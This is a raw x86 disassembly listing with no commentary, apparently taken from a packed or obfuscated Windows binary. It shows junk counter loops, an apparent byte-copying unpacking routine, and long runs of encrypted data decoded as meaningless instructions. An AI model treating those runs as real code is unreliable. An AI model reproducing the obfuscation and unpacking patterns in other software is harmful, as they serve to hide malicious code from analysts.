  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x739d1a84],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103c2
  4103eb:	fisttp QWORD PTR [edx+0x70718378]
  4103f1:	dec    esi
  4103f2:	dec    ecx
  4103f3:	xchg   dh,bl
  4103f5:	out    dx,al
  4103f6:	icebp  
  4103f7:	add    al,0x62
  4103f9:	test   BYTE PTR [ebx+0x5],bl
  4103fc:	mov    edx,0x96474bc5
  410401:	mov    eax,ecx
  410403:	icebp  
  410404:	cmp    eax,0xb042059c
  410409:	push   0x50cebf30
  41040e:	pop    eax
  41040f:	shl    BYTE PTR ds:0xd2307a31,1
  410415:	out    dx,al
  410416:	cmc    
  410417:	arpl   WORD PTR [ebx+0x117a7161],bp
  41041d:	cmp    edi,DWORD PTR [edi-0x49]
  410420:	repnz xor al,0xd3
  410423:	xlat   BYTE PTR ds:[ebx]
  410424:	cmp    esp,ebx
  410426:	mov    ch,0xa
  410428:	aaa    
  410429:	outs   dx,DWORD PTR ds:[esi]
  41042a:	sub    eax,0xc0e22cbc
  41042f:	mov    al,ds:0xc3c5dd40
  410434:	add    cl,BYTE PTR [ebp-0xb3a5b2c]
  41043a:	add    eax,DWORD PTR [esi+0x48]
  41043d:	cdq    
  41043e:	sub    eax,0x8d48a09a
  410443:	xor    BYTE PTR [ebx-0x163da20],bl
  410449:	(bad)  
  41044a:	icebp  
  41044b:	mov    eax,0xc53da321
  410450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410451:	mov    ch,0x62
  410453:	(bad)  
  410454:	(bad)  
  410455:	in     al,dx
  410456:	dec    edx
  410457:	xchg   edi,eax
  410459:	popf   
  41045a:	pop    edi
  41045b:	pusha  
  41045c:	mov    cl,0xd
  41045e:	jge    0x4104ce
  410460:	mov    esi,0x24be102a
  410465:	lds    esp,FWORD PTR [edi]
  410467:	xchg   BYTE PTR [ecx+0x76],ch
  41046a:	sbb    eax,DWORD PTR [eax+0x53]
  41046d:	inc    edi
  41046e:	stc    
  41046f:	jns    0x4104a0
  410471:	sub    eax,0x7e85d6d6
  410476:	adc    DWORD PTR [eax+edi*8+0x699cdef3],edx
  41047d:	jg     0x4104ee
  41047f:	mov    BYTE PTR [edi-0x22],ch
  410482:	dec    esp
  410483:	sub    eax,0x370c3df1
  410488:	cmc    
  410489:	cmp    DWORD PTR [ecx-0x3aafa21a],esp
  41048f:	jmp    0x907b876
  410494:	xchg   esp,eax
  410495:	jle    0x4104a8
  410497:	and    BYTE PTR [ebx],bh
  410499:	stc    
  41049a:	retf   0xa353
  41049d:	loopne 0x4104a9
  41049f:	or     DWORD PTR [ecx-0x25],eax
  4104a2:	rcr    BYTE PTR [ecx-0x41],1
  4104a5:	out    0xc5,al
  4104a7:	outs   dx,BYTE PTR ds:[esi]
  4104a8:	ins    BYTE PTR es:[edi],dx
  4104a9:	mov    es,WORD PTR [ebp-0x79aebc6a]
  4104af:	jge    0x4104b2
  4104b1:	test   eax,0x6685e51
  4104b6:	ret    0x3d1e
  4104b9:	stos   BYTE PTR es:[edi],al
  4104ba:	push   esp
  4104bb:	or     DWORD PTR [ebp-0x40],edx
  4104be:	scas   al,BYTE PTR es:[edi]
  4104bf:	stc    
  4104c0:	rcl    bl,0xaa
  4104c3:	clc    
  4104c4:	and    ecx,DWORD PTR [edi]
  4104c6:	xor    eax,0xb877b70
  4104cb:	mov    bl,0x2c
  4104cd:	pop    edi
  4104ce:	or     al,BYTE PTR [ecx+0x3568ac43]
  4104d4:	cmp    eax,0xb5d36538
  4104d9:	and    ebx,DWORD PTR [ebx-0x3b]
  4104dc:	das    
  4104dd:	loope  0x41046e
  4104df:	adc    eax,0xce987a8
  4104e4:	addr16 inc ebx
  4104e6:	mov    edx,0x1fc8795
  4104eb:	xchg   esi,eax
  4104ec:	inc    edx
  4104ed:	sbb    al,0xd7
  4104ef:	in     eax,0x3d
  4104f1:	enter  0x4481,0xa3
  4104f5:	mov    al,0x4
  4104f7:	xchg   DWORD PTR [eax],ebx
  4104f9:	fld    QWORD PTR [ebx-0x1a]
  4104fc:	mov    ch,0x6f
  4104fe:	xchg   edi,eax
  4104ff:	cmc    
  410500:	dec    ebx
  410501:	cdq    
  410502:	pop    ds
  410503:	shl    DWORD PTR [edx-0x3a7b1df6],cl
  410509:	out    0x38,al
  41050b:	or     DWORD PTR [edi+eax*4+0x2],0x531dd7b9
  410513:	fisubr WORD PTR [esi+0x7ec6e6e4]
  410519:	(bad)  [esi]
  41051b:	mov    WORD PTR [esi+0x28],?
  41051e:	lahf   
  41051f:	mov    edi,0xaa70786e
  410524:	dec    ebx
  410525:	xchg   ebp,eax
  410526:	(bad)  
  410527:	pop    ss
  410528:	aam    0xc3
  41052a:	fidiv  WORD PTR [ebx]
  41052c:	(bad)  
  41052d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41052e:	mov    edi,0xafffe9d5
  410533:	js     0x410509
  410535:	sub    al,0xc4
  410537:	lea    ebp,[ecx+0x1e]
  41053a:	add    DWORD PTR [edi+0x1f423a32],ebx
  410540:	or     BYTE PTR [eax+0x5be217ee],ah
  410546:	pop    edx
  410547:	push   esp
  410548:	mov    dh,0xd1
  41054a:	test   eax,0xa7cb9ce5
  41054f:	inc    edx
  410550:	mov    ah,0xe0
  410552:	pop    ds
  410553:	adc    ah,cl
  410555:	cmp    eax,DWORD PTR [eax+0xb]
  410558:	fdiv   DWORD PTR [edi+edx*1]
  41055b:	hlt    
  41055c:	das    
  41055d:	jnp    0x41053a
  41055f:	push   cs
  410560:	or     dl,BYTE PTR [edi+0x75]
  410563:	inc    ebx
  410564:	dec    ebx
  410565:	inc    al
  410567:	rol    BYTE PTR [ebp-0x3c],cl
  41056a:	bound  edi,QWORD PTR [esi-0x35]
  41056d:	leave  
  41056e:	sbb    DWORD PTR [ebx],edx
  410570:	sahf   
  410571:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410572:	ror    DWORD PTR [ecx+0x69],1
  410575:	pop    edx
  410576:	shl    bl,0x1e
  410579:	mov    ebx,DWORD PTR [ebx-0x4d]
  41057c:	iret   
  41057d:	nop
  41057e:	adc    BYTE PTR [edx+eiz*1-0x6d],bl
  410582:	ficomp WORD PTR [edi+0xd066de3]
  410588:	cs lahf 
  41058a:	xchg   ecx,eax
  41058b:	mov    eax,0x225a86b4
  410590:	(bad)  
  410591:	xor    DWORD PTR [eax],ebx
  410593:	pop    es
  410594:	hlt    
  410595:	mov    bl,0x7
  410597:	push   ebx
  410598:	and    al,0xc3
  41059a:	mov    ecx,0x84321ee2
  41059f:	lods   al,BYTE PTR ds:[esi]
  4105a0:	(bad)  [ebp-0x4b]
  4105a3:	mov    al,0xe7
  4105a5:	mov    cl,0xc7
  4105a7:	in     eax,0xf3
  4105a9:	retf   
  4105aa:	inc    ecx
  4105ab:	lock pop ebx
  4105ad:	xchg   edx,eax
  4105ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105af:	sbb    DWORD PTR [eax-0x59],esp
  4105b2:	neg    BYTE PTR [ecx+0x4b354f37]
  4105b8:	fwait
  4105b9:	outs   dx,BYTE PTR ds:[esi]
  4105ba:	and    al,cl
  4105bc:	pop    ds
  4105bd:	repnz enter 0xdb06,0xea
  4105c2:	fwait
  4105c3:	int    0xc2
  4105c5:	mov    eax,ds:0x3200d7a9
  4105ca:	(bad)  
  4105cb:	xchg   ecx,eax
  4105cc:	xchg   ebx,eax
  4105cd:	xchg   ecx,eax
  4105ce:	push   ebx
  4105cf:	dec    edi
  4105d0:	mov    eax,0xfecc6594
  4105d5:	gs in  al,dx
  4105d7:	out    0x2d,al
  4105d9:	mov    esp,0xc3f12e38
  4105de:	aam    0xb
  4105e0:	fwait
  4105e1:	outs   dx,DWORD PTR ds:[esi]
  4105e2:	neg    esp
  4105e4:	adc    al,0xb9
  4105e6:	inc    edi
  4105e7:	(bad)  
  4105e8:	xlat   BYTE PTR ds:[ebx]
  4105e9:	pop    ebp
  4105ea:	rcl    DWORD PTR ds:0xc671f0ff,1
  4105f0:	aad    0x95
  4105f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105f3:	cmp    ebx,ebp
  4105f5:	sbb    eax,0x5682aab5
  4105fa:	mov    ds:0xbe0173a7,al
  4105ff:	daa    
  410600:	or     eax,0xf6554323
  410605:	mov    cl,0xa1
  410607:	sahf   
  410608:	sub    edx,esp
  41060a:	pop    esi
  41060b:	int3   
  41060c:	xchg   edx,eax
  41060d:	push   0x3a150bdd
  410612:	push   0xffffffff
  410614:	mov    BYTE PTR [ebx+esi*1+0x20],dh
  410618:	stc    
  410619:	or     al,0xb8
  41061b:	jns    0x410604
  41061d:	adc    al,0x42
  41061f:	rol    DWORD PTR [esi+0x35528c1],0xf1
  410626:	loope  0x41068d
  410628:	jo     0x41065b
  41062a:	ins    BYTE PTR es:[edi],dx
  41062b:	mov    ah,BYTE PTR ss:[ebp-0x73]
  41062f:	or     al,0xae
  410631:	and    eax,0x560104b0
  410636:	xchg   edi,eax
  410637:	xchg   ecx,eax
  410638:	adc    BYTE PTR es:[ecx-0x4d492f6c],cl
  41063f:	sahf   
  410640:	or     al,0x64
  410642:	sub    DWORD PTR ds:0xa6704a9f,ebp
  410648:	aaa    
  410649:	add    al,0x85
  41064b:	xor    eax,0xf91d8f5a
  410650:	mov    DWORD PTR [eax+0x7025f031],esp
  410656:	call   0xae5e33cb
  41065b:	sub    al,0x19
  41065d:	stos   BYTE PTR es:[edi],al
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433713,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433713
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433713,edx
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	dec    ebx
  4107d5:	das    
  4107d6:	outs   dx,DWORD PTR ds:[esi]
  4107d7:	ja     0x41076a
  4107d9:	mov    ebx,0x7cea7e7e
  4107de:	jle    0x41085e
  4107e0:	lods   eax,DWORD PTR ds:[esi]
  4107e1:	jg     0x4107e6
  4107e3:	adc    edx,esi
  4107e5:	and    al,ch
  4107e7:	xor    ah,BYTE PTR [eax-0x7]
  4107ea:	(bad)  
  4107eb:	repnz out 0x6,al
  4107ee:	mov    al,0xd9
  4107f0:	stos   BYTE PTR es:[edi],al
  4107f1:	imul   esp,DWORD PTR [esi-0x36],0x6b3466ba
  4107f8:	loope  0x4107ce
  4107fa:	pop    ecx
  4107fb:	push   es
  4107fc:	xchg   DWORD PTR [eax-0xe],ebp
  4107ff:	lea    esp,[ecx]
  410801:	push   esp
  410802:	jp     0x4107c7
  410804:	xor    edi,DWORD PTR [ebx+0x74c88a74]
  41080a:	fld    DWORD PTR [edx+0x2a7cb605]
  410810:	imul   ebp,eax,0xeb6030c9
  410816:	ins    BYTE PTR es:[edi],dx
  410817:	stc    
  410818:	popf   
  410819:	pop    esi
  41081a:	dec    esp
  41081b:	sbb    BYTE PTR ds:0xce248482,ah
  410821:	xor    edx,DWORD PTR [edi]
  410823:	sbb    ebp,DWORD PTR [ecx+0x79b4fdc9]
  410829:	iret   
  41082a:	dec    ebx
  41082b:	mov    edi,0x7cca0078
  410830:	adc    al,BYTE PTR es:[edx+edx*1-0x6be351b8]
  410838:	out    0x94,al
  41083a:	inc    ecx
  41083b:	inc    esi
  41083c:	mov    ds:0xd7590097,al
  410841:	arpl   WORD PTR [eax+0x2],si
  410844:	sbb    ch,BYTE PTR [esi-0x75]
  410847:	aam    0x2f
  410849:	iret   
  41084a:	pop    esp
  41084b:	leave  
  41084c:	sub    eax,0x45ba2a33
  410851:	aaa    
  410852:	and    dl,BYTE PTR [edi]
  410854:	mov    ebx,0x8f599af2
  410859:	cmp    eax,0xa4bd7fb3
  41085e:	call   0x1f1a:0x90919c82
  410865:	xchg   edx,eax
  410866:	fisttp QWORD PTR [ecx]
  410868:	jns    0x410836
  41086a:	cs add al,0x94
  41086d:	mul    DWORD PTR [eax+0x70ff7d67]
  410873:	lahf   
  410874:	mov    es,ebx
  410876:	arpl   di,bx
  410878:	jns    0x4108aa
  41087a:	retf   
  41087b:	jne    0x4108d5
  41087d:	sub    esi,DWORD PTR [ecx+0x63f00e1]
  410883:	dec    eax
  410884:	jae    0x41088a
  410886:	arpl   WORD PTR [ebx+eiz*2-0x19],si
  41088a:	push   0x113c6d56
  41088f:	adc    eax,0x1b74c08
  410894:	out    dx,al
  410895:	xor    ch,bl
  410897:	into   
  410898:	inc    DWORD PTR [ebx+0x13ff7831]
  41089e:	mov    ebp,gs
  4108a0:	gs jg  0x41091f
  4108a3:	rcl    DWORD PTR [edi+0x1066a514],cl
  4108a9:	pusha  
  4108aa:	loope  0x41087b
  4108ac:	scas   al,BYTE PTR es:[edi]
  4108ad:	out    0x46,al
  4108af:	aad    0x9f
  4108b1:	xchg   edi,eax
  4108b2:	fimul  DWORD PTR [edx]
  4108b4:	daa    
  4108b5:	cmc    
  4108b6:	add    eax,0x2022df65
  4108bb:	std    
  4108bc:	js     0x4108e5
  4108be:	cmp    al,0x93
  4108c0:	push   edx
  4108c1:	aaa    
  4108c2:	jns    0x4108ff
  4108c4:	cmp    dh,BYTE PTR [ebx]
  4108c6:	lahf   
  4108c7:	fcom   QWORD PTR [ecx-0xc]
  4108ca:	push   ss
  4108cb:	inc    edi
  4108cc:	pop    ebx
  4108cd:	adc    eax,0xe1cb5e29
  4108d2:	retf   0xd3eb
  4108d5:	dec    ebp
  4108d6:	scas   eax,DWORD PTR es:[edi]
  4108d7:	repnz mov dl,0xb5
  4108da:	(bad)  
  4108db:	jmp    0xa2ce395e
  4108e0:	daa    
  4108e1:	arpl   WORD PTR [ecx+0x36c0b4b1],bp
  4108e7:	retf   
  4108e8:	hlt    
  4108e9:	not    BYTE PTR [esp+ebp*8-0x5a6d42c1]
  4108f0:	out    0xc2,eax
  4108f2:	(bad)  
  4108f3:	pop    edi
  4108f4:	pusha  
  4108f5:	and    eax,0x1f
  4108f8:	std    
  4108f9:	dec    ecx
  4108fa:	xchg   ebp,eax
  4108fb:	repz dec ecx
  4108fd:	outs   dx,DWORD PTR ds:[esi]
  4108fe:	popa   
  4108ff:	adc    dl,0x18
  410902:	aad    0x1c
  410904:	fcom   st(0)
  410906:	push   cs
  410907:	imul   edi,DWORD PTR [eax],0x61
  41090a:	std    
  41090b:	xchg   esi,eax
  41090c:	dec    BYTE PTR [ecx]
  41090e:	pop    esp
  41090f:	or     al,0xb2
  410911:	imul   esi,DWORD PTR [eax+0x79],0x61
  410915:	out    dx,al
  410916:	inc    ecx
  410917:	mov    ecx,es
  410919:	mov    esi,0x6b17c3bb
  41091e:	test   edi,ebp
  410920:	jp     0x410901
  410922:	mov    eax,0x123a744d
  410927:	inc    esp
  410928:	(bad)  
  410929:	out    0xd8,al
  41092b:	add    eax,0x6d178a96
  410930:	and    eax,0x71ca92f3
  410935:	or     eax,0x3d814086
  41093a:	push   edi
  41093b:	mov    dh,0x93
  41093d:	or     BYTE PTR [edx],bl
  41093f:	retf   
  410940:	pop    ebp
  410941:	call   0x55142a8f
  410946:	cmp    BYTE PTR [edi+0x60f772d7],bh
  41094c:	fldcw  WORD PTR [ebx]
  41094e:	xchg   edx,eax
  41094f:	scas   eax,DWORD PTR es:[edi]
  410950:	lahf   
  410951:	out    dx,al
  410952:	xchg   ebx,eax
  410953:	inc    ebx
  410954:	sahf   
  410955:	cmp    al,0xda
  410957:	push   edi
  410958:	jle    0x410985
  41095a:	lods   eax,DWORD PTR ds:[esi]
  41095b:	jne    0x410991
  41095d:	(bad)  
  41095e:	jge    0x410914
  410960:	xchg   DWORD PTR [edi+0x84f49e2],edx
  410966:	call   0x365c:0x2e53497f
  41096d:	iret   
  41096e:	bound  edx,QWORD PTR [eax]
  410970:	push   edi
  410971:	and    bl,ch
  410973:	jo     0x41092b
  410975:	ins    DWORD PTR es:[edi],dx
  410976:	push   0x37
  410978:	jge    0x410974
  41097a:	rol    DWORD PTR [edx],1
  41097c:	mov    al,ds:0xde4b6c34
  410981:	sbb    al,0x9f
  410983:	sub    DWORD PTR [edi],edi
  410985:	mov    BYTE PTR [esi-0x72],ch
  410988:	mov    al,0x37
  41098a:	shl    ch,0x6
  41098d:	mov    DWORD PTR [eax+eax*4],ebp
  410990:	daa    
  410991:	pop    esi
  410992:	inc    edx
  410993:	sub    eax,0xba05436f
  410998:	sbb    DWORD PTR [ebp-0x71c7a6cf],ebx
  41099e:	push   es
  41099f:	and    BYTE PTR [ebx],0x87
  4109a2:	sub    eax,0xd272e2d0
  4109a7:	pop    eax
  4109a8:	and    ecx,DWORD PTR [ebp+0x19]
  4109ab:	xor    BYTE PTR [ecx+0x32],ch
  4109ae:	cmp    eax,DWORD PTR [ebx+0x412a7498]
  4109b4:	jg     0x4109c9
  4109b6:	pusha  
  4109b7:	sub    BYTE PTR [eax+ebx*1+0x37],0x41
  4109bc:	retf   
  4109bd:	cmp    al,0x77
  4109bf:	cmp    DWORD PTR [ebp+0x5d8d7f5f],ecx
  4109c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109c6:	lds    eax,FWORD PTR [edi+0x2265049a]
  4109cc:	(bad)  
  4109ce:	add    BYTE PTR [edx],bl
  4109d0:	adc    al,0xa4
  4109d2:	les    edi,FWORD PTR [esi-0x79105736]
  4109d8:	out    0xa3,al
  4109da:	dec    ebx
  4109db:	mov    bh,0x91
  4109dd:	add    eax,0xaff021bb
  4109e2:	clc    
  4109e3:	jmp    DWORD PTR [ebx+eiz*2-0x5b373101]
  4109ea:	enter  0xaad8,0xf3
  4109ee:	fs mov ch,0x80
  4109f1:	or     eax,0x4d25d47e
  4109f6:	leave  
  4109f7:	inc    esi
  4109f8:	push   0x5b4c345f
  4109fd:	add    ebx,DWORD PTR [ebx]
  4109ff:	inc    eax
  410a00:	mov    ds:0x70d97587,al
  410a05:	add    ecx,DWORD PTR [edi+0x65]
  410a08:	lods   eax,DWORD PTR ds:[esi]
  410a09:	xchg   ebx,eax
  410a0a:	pop    ecx
  410a0b:	test   eax,0xa8f734e0
  410a10:	pop    ebx
  410a11:	xor    eax,0xdac1037e
  410a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a17:	push   ds
  410a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a19:	add    eax,0x65d5ab57
  410a1e:	jmp    0xaa5b:0xb2ca533f
  410a25:	dec    edx
  410a26:	clc    
  410a27:	jns    0x410a4f
  410a29:	xchg   edi,eax
  410a2a:	sbb    DWORD PTR [ebx+0x4bde8377],edx
  410a30:	cmp    DWORD PTR [esi-0x67],esp
  410a33:	lds    esi,FWORD PTR ds:0x5eed66a9
  410a39:	lds    edi,FWORD PTR [esi-0x46c1c1e1]
  410a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a40:	mov    ebp,0x1cf83918
  410a45:	inc    eax
  410a46:	jo     0x410a31
  410a48:	stos   BYTE PTR es:[edi],al
  410a49:	sub    dl,ah
  410a4b:	mov    esi,0xf36a6381
  410a50:	mov    eax,0xb8ccafe5
  410a55:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	xor    al,0x89
  410b22:	adc    DWORD PTR [esi+0xd],edi
  410b25:	inc    esi
  410b26:	jle    0x410ba6
  410b28:	icebp  
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b8e
  410b2d:	rol    DWORD PTR [ebx+0xb67d9f6],cl
  410b33:	adc    BYTE PTR [edi-0x41],bl
  410b36:	cmp    cl,BYTE PTR [esi+0x558ed2cd]
  410b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3d:	aad    0xa8
  410b3f:	pop    ebx
  410b40:	mov    ecx,0xf8a782b8
  410b45:	retf   0x859c
  410b48:	jns    0x410b2d
  410b4a:	int3   
  410b4b:	arpl   WORD PTR [ecx+edi*4+0x1bc3b6c],sp
  410b52:	jno    0x410b61
  410b54:	int3   
  410b55:	push   ss
  410b56:	aam    0xa8
  410b58:	cmp    ebp,DWORD PTR [eax+0x74]
  410b5b:	mov    al,0x41
  410b5d:	jecxz  0x410b91
  410b5f:	arpl   di,bx
  410b61:	push   0x4e
  410b63:	dec    ebx
  410b64:	fisubr DWORD PTR [edi]
  410b66:	jge    0x410b42
  410b68:	icebp  
  410b69:	sub    DWORD PTR [edx+0x66e38051],0xfec1b274
  410b73:	ins    DWORD PTR es:[edi],dx
  410b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b75:	xchg   ecx,eax
  410b76:	mov    ds:0x4b0cface,al
  410b7b:	sub    eax,ebp
  410b7d:	imul   edi,DWORD PTR ss:0x21ff8d8a,0xffffffe2
  410b85:	jl     0x410bd8
  410b87:	repz xchg ebx,eax
  410b89:	mov    bl,0x44
  410b8b:	bound  esi,QWORD PTR [edi+0x1635e112]
  410b91:	dec    eax
  410b92:	push   0x70
  410b94:	daa    
  410b95:	fisubr DWORD PTR [esi]
  410b97:	arpl   WORD PTR [edx+0x66],ax
  410b9a:	mov    ch,0xe4
  410b9c:	adc    eax,DWORD PTR cs:[ebx-0x1e]
  410ba0:	fwait
  410ba1:	loope  0x410b4f
  410ba3:	aaa    
  410ba4:	mov    eax,0xf096113e
  410ba9:	clc    
  410baa:	in     eax,dx
  410bab:	mov    esp,0x434b0984
  410bb0:	add    ebx,DWORD PTR [ecx]
